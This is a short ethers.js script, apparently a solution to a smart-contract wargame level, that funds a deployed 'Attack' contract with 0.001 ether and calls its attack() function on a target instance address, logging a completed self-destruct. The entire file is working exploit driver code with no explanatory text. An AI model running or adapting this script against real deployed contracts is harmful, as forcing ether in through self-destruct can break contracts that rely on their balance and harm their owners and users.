attackContractAddress = '0xdA2F257E07d783157d5Cb611f00424579148DcbE';
(async () => {
    const account = await ethers.getSigner();
    const attack = await ethers.getContractAt("Attack", attackContractAddress, account);
    const tx = {
        from: account.address,
        to: attack.address,
        value: ethers.utils.parseEther("0.001")
    };
    res = await account.sendTransaction(tx);
    await attack.attack(process.env.INSTANCE);
    log(`self destruct Done`);
})()